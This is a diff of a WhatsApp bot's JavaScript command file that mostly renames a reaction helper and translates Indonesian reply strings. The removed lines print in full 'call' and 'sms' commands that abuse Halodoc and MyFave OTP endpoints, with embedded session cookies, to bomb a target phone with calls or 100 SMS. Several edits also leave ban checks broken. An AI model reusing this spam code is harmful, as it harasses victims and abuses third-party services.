 if (args[0] === "on") {
@@ -2998,11 +2976,12 @@ break
 //=================================================
 case "antitoxic":
 {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
+if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
 if (welcmm) return reply('Sudah Aktif')
@@ -3024,8 +3003,8 @@ reply('Sukses Mematikan Anti Toxic  di group ini')
 break
 //=================================================
 case 'larangan': case 'peraturan': {
-await loading()
- if (!m.isGroup) return reply('Buat Di Group Bodoh')
+await inireact()
+ if (!m.isGroup) return reply('Make it in the Stupid Group')
 zetsubo.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot ʜᴡ ᴍᴏᴅꜱ ᴡᴀ
 Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!
 
@@ -3066,46 +3045,6 @@ zetsubo.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\
 }
 break
 //=================================================//
-case "call":
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6289503267904`)
-let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
-if (args[0].startsWith(`+6289503267904`)) return reply('Tidak bisa call ke nomor ini!')
-axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
-break
-//=================================================
-case 'sms': {
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
-const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-if (m.quoted || text) {
-if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
-if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
-let nosms = '+' + froms.replace('@s.whatsapp.net', '')
-let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
-let ua = mal[Math.floor(Math.random() * mal.length)];
-let axios = require('axios').default;
-let hd = {
-'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
-};
-const dat = {
-'phone': nosms
-};
-for (let x = 0; x < 100; x++) {
-axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
-headers: hd
-}).then(res => {
-console.log(res);
-}).catch(err => {
-console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY ZetsuboXygen `);
-});
-}
-} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6289503267904`)
-reply(`spam sms/call akan di kirim ke no target`)
-}
-break
-//=================================================//
 case 'yts': case 'ytsearch': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!text) throw `Example : ${prefix + command} story wa anime`
@@ -3140,6 +3079,7 @@ case 'runtime':
                 break
 //=================================================
 case 'ytmp4': case 'youtubemp4':
+await inireact()
 			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
     loading()
 			axios.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
@@ -3153,8 +3093,8 @@ case 'ytmp4': case 'youtubemp4':
 			break
 //=================================================
 case 'memancing': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
@@ -3163,7 +3103,8 @@ await loading()
 }
 break
 //=================================================
-case 'getvideo': {
+case 'video': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 let { ytv } = require('./lib/y2mate')
 if (!text) throw `Example : ${prefix + command} 1`
@@ -3179,18 +3120,19 @@ zetsubo.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp
 break
 //=================================================
 case "ytreels": case "youtubereels":{
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
+await inireact()
 if (!text) return reply('Masukan Link Nya!!!')
-await loading ()
+await inireact()
 downloadMp4(text)
 }
 break
 //=================================================
 case 'tiktokvideo':{
+await inireact() 
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!text) return reply( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
-await loading ()
+await inireact()
 require('./lib/tiktok').Tiktok(q).then( data => {
 zetsubo.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
 })
@@ -3199,10 +3141,10 @@ break
 //=================================================
 case 'tiktokmp3':
 case 'tiktokaudio':{
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
+await inireact()
 if (!text) return reply( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
-await loading ()
+await inireact()
 require('./lib/tiktok').Tiktok(q).then( data => {
 zetsubo.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
 })
@@ -3210,15 +3152,15 @@ zetsubo.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' 
 break
 //=================================================
 case 'igvideo': case 'igreels':
-			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/tv/CXwPLSIFDW0/?igshid=NTc4MTIwNjQ2YQ==`)
-			await loading()
+	if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/tv/CXwPLSIFDW0/?igshid=NTc4MTIwNjQ2YQ==`)
+			await inireact()
 			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
 				zetsubo.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
 			})
 			break
 		case 'fbvideo':
 			if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
-			await loading()
+			await inireact()
 			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
 				zetsubo.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn` })
 			})
@@ -3232,8 +3174,8 @@ case 'igvideo': case 'igreels':
 			break
 //=================================================//
 case 'wm': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) 
+await inireact()
 var teks = `${text}`
 {
  if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
@@ -3247,6 +3189,7 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================// 
 case 'ping': {
+await inireact()
   const startTime = new Date();
   const pingMsg = await zetsubo.sendMessage(m.chat, { text: '*Classifying*' });
 
@@ -3295,8 +3238,8 @@ case 'cloud':
 case 'summersand':
 case 'horrorblood':
 case 'thunder':
-	if (args.length == 0) return reply(`Example: ${prefix + command} ZetsuboXygen`)
-	await loading()
+	if (args.length == 0) return reply(`Example: ${prefix + command} Classic`)
+	await inireact()
 	zetsubo.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${command}` } })
 	break
 //=================================================//
@@ -3462,7 +3405,7 @@ case 'sound159':
 case 'sound160':
 case 'sound161':
 if (isBan) return reply('😹')
-await loading()
+await inireact() 
  zetsubogans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await zetsubo.sendMessage(from, { audio: zetsubogans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
 mediaType:  1,
@@ -3474,8 +3417,8 @@ sourceUrl: `https://chat.whatsapp.com/ETsxysQPYXxG1P8JQ1RQHV`,
 break
 //=================================================//
 case 'gambar': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(text)
 result = anu[Math.floor(Math.random() * anu.length)]
@@ -3484,6 +3427,7 @@ zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m}
 break
 //=================================================
 case 'sc': case 'script': case 'repo':
+await inireact()
 
  zetsubo.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/b103691007c8ce5ee8a94.jpg` }, caption: 
 `╭╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╮\n\n ➨ 𝑯𝒊 *${pushname}* \n\n ➨ 𝑰 𝒂𝒎 𝑪𝑳𝑨𝑺𝑺𝑰𝑪_𝑨𝑰 𝑩𝑶𝑻 ☣.\n\n ➨ 𝒀𝒐𝒖 𝑪𝒂𝒏 𝑮𝒆𝒕 𝑴𝒚 𝑺𝒐𝒖𝒓𝒄𝒆 𝑪𝒐𝒅𝒆 𝑽𝒊𝒂.\n\n ➨ 𝑻𝒉𝒆 𝑳𝒊𝒏𝒌 𝑩𝒆𝒍𝒐𝒘 ⇣⇣.\n\n ➨𝑭𝒐𝒓𝒌 𝑨𝒏𝒅 𝑮𝒊𝒗𝒆 𝑨 𝑺𝒕𝒂𝒓 ➻ ❴ https://github.com/Samue-l1/Classic-v3-BUG ❵\n\n ➨ 𝑹𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒕𝒐 𝒕𝒂𝒌𝒆 𝒂 𝒍𝒐𝒐𝒌 𝒐𝒏 𝒓𝒆𝒂𝒅𝒎𝒆 𝒃𝒆𝒇𝒐𝒓𝒆 𝒅𝒆𝒑𝒍𝒐𝒚𝒎𝒆𝒏𝒕.\n\n ➨ 𝑴𝒂𝒅𝒆 𝑩𝒚 ➻ 𝐊𝐈𝐍𝐆 𝐒𝐀𝐌 ✇\n\n╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯⸼` });
@@ -3491,8 +3435,8 @@ case 'sc': case 'script': case 'repo':
    break;
 //=================================================
 case 'cecanmalaysia': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan malaysia`)
 result = anu[Math.floor(Math.random() * anu.length)]
@@ -3502,6 +3446,7 @@ break
 //=================================================
 case 'broadcast':
             case 'bcgroup': {
+		    await inireact()
                 if (!isCreator) return reply(mess.owner)
                 if (!text) return reply(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                 let getGroups = await zetsubo.groupFetchAllParticipating()
@@ -3531,7 +3476,7 @@ case 'broadcast':
             break
 //=================================================
 case "alive":
-
+await inireact()
 const audiovn = "./Classic.mp3";
     const dooc = {
         audio: {
@@ -3561,8 +3506,8 @@ await zetsubo.sendMessage(m.chat, dooc, {quoted: m});
 break;
 //=================================================
 case 'cecanvietnam': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan vietnam`)
 result = anu[Math.floor(Math.random() * anu.length)]
@@ -3657,13 +3602,13 @@ case 'shinobu':
 case 'megumin':
 case 'wallnime':
 case 'quotesimage':
-await loading()
+await inireact()
 zetsubo.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
 break
 //=================================================//
 case 'neko' :
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 zetsubo.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted:m }).catch(err => {
  return('Error!')
@@ -3671,8 +3616,8 @@ zetsubo.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺
 break
 //=================================================//
 case 'waifu' :
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 zetsubo.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted:m }).catch(err => {
  return('Error!')
@@ -3680,8 +3625,8 @@ zetsubo.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang �
 break
 //=================================================//
 case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  axios.get(`https://api.waifu.pics/sfw/${command}`)
 .then(({data}) => {
 zetsubo.sendImage(from, data.url, 'Success Coy', m)
@@ -3689,8 +3634,8 @@ zetsubo.sendImage(from, data.url, 'Success Coy', m)
 break
 //=================================================//
 case 'fajar':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 FajarNews().then(async(res) => {
 console.log(res) 
 no = 0
@@ -3709,8 +3654,8 @@ reply(teks)
 break
 //=================================================//
 case 'cnn':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 CNNNews().then(res => {
 no = 0
 teks = ""
@@ -3727,6 +3672,7 @@ break
 //=================================================//
 case 'delete':
             case 'del': {
+		  await inireact()
                 if (!isCreator) return reply(mess.done)
                 if (!m.quoted) throw false
                 let {
@@ -3748,8 +3694,8 @@ case 'delete':
             break
 //=================================================//
 case 'cnbc':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 CNBCNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3766,8 +3712,8 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case 'tribun':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 TribunNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3785,8 +3731,8 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case 'indozone':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 IndozoneNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3804,8 +3750,8 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case 'kompas':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 KompasNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3823,6 +3769,7 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case 'tourl': {
+await inireact()
                 reply(zetsubo.wait)
                 let media = await zetsubo.downloadAndSaveMediaMessage(qmsg)
                 if (/image/.test(mime)) {
@@ -3838,8 +3785,8 @@ case 'tourl': {
             break
 //=================================================//
 case 'daily':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 DailyNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3855,8 +3802,8 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case 'inews':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 iNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3874,8 +3821,8 @@ reply(teks)
 break
 //=================================================//
 case 'okezone':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 OkezoneNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3892,8 +3839,8 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case 'sindo':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 SindoNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3910,8 +3857,8 @@ reply(teks)
 break
 //=================================================//
 case 'tempo':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 TempoNews().then(async(res) => {
 no = 0
 teks = ""
@@ -3940,8 +3887,8 @@ case 'autoread':
                 break
 //=================================================//
 case "kontan":
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 KontanNews().then(async (res) => {
 teks = ""
 no = 0
@@ -3959,8 +3906,8 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case "merdeka":
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 MerdekaNews().then(async (res) => {
 teks = ""
 no = 0
@@ -3977,7 +3924,7 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case "jalantikus":
-await loading()
+await inireact()
 var reis = await JalanTikusMeme()
 teks = ""
 teks += "Jalan Tikus Meme\n\n"
@@ -3990,13 +3937,13 @@ case 'faktaunik':
 case 'katabijak':
 case 'pantun':
 case 'bucin':
-await loading()
+await inireact() 
 var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
 reply(data.result)
 break
 //=================================================
 case 'listsurah':
-await loading()
+await inireact()
 axios
 .get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
 .then(({ data }) => {
@@ -4010,8 +3957,8 @@ reply(text)
 break
 //=================================================
 case 'alquran':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
 axios
 .get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
@@ -4029,15 +3976,15 @@ reply(text)
 break
 //=================================================
 case 'alquranaudio':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
 zetsubo.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
 break
 //=================================================
 case 'asmaulhusna':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 axios
 .get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
 .then(({ data }) => {
@@ -4052,8 +3999,8 @@ reply(text)
 break
 //=================================================
 case 'kisahnabi':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
 axios
 .get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
@@ -4069,8 +4016,8 @@ reply(text)
 break
 //=================================================
 case 'jadwalsholat':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
 axios
 .get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
@@ -4092,8 +4039,8 @@ reply(text)
 break
 //=================================================
 case 'smeme':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Balas Image Dengan Caption ${prefix + command}`
 if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
 if (/image/.test(mime)) {
@@ -4106,8 +4053,8 @@ zetsubo.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, autho
 break
 //=================================================
 case 'toimage': case 'toimg': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
 let media = await zetsubo.downloadAndSaveMediaMessage(quoted)
@@ -4123,8 +4070,8 @@ fs.unlinkSync(ran)
 break
 //=================================================//
 case 'tomp4': case 'tovideo': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) 
+await inireact()
 if (!quoted) throw `Balas sticker video Dengan Caption ${prefix + command}`
 if (/video/.test(mime)) {
 let { webp2mp4File } = require('./lib/uploader')
@@ -4137,7 +4084,7 @@ await fs.unlinkSync(media)
 break
 case 'tomp3': {
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
-await loading()
+await inireact()
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 let media = await zetsubo.downloadMediaMessage(quoted)
 let { toAudio } = require('./lib/converter')
@@ -4147,8 +4094,8 @@ zetsubo.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: 
 break
 //=================================================//
 case 'toaudio': case 'audio': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+await inireact()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 let media = await zetsubo.downloadMediaMessage(quoted)
@@ -4159,8 +4106,8 @@ zetsubo.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m
 break
 //=================================================//
 case 'tovn': case 'voice': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
 if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
 reply('*Sabar Cuy Loading*')
@@ -4179,6 +4126,7 @@ thumbnail: thumb
 break
 //=================================================//
 case 'restart':  
+await inireact()
   if (!isCreator) throw `Owner Only` 
   reply(`*Restarting Classic* .`)  
   await sleep(3000)  
@@ -4186,6 +4134,7 @@ case 'restart':
   break;
 //=================================================//
 case "dp": { 
+await inireact()
  try { 
  ha = m.quoted.sender; 
  qd = await zetsubo.getName(ha); 
@@ -4200,8 +4149,8 @@ case "dp": {
  break;
 //=================================================//
 case "quotes":
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan)
+await inireact()
  var resi = await Quotes()
 teks = `\nAuthor: ${resi.author}\n`
 teks = `\nQuotes:\n`
@@ -4210,175 +4159,175 @@ reply(teks)
 break
 //=================================================//
 case 'asupan1':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
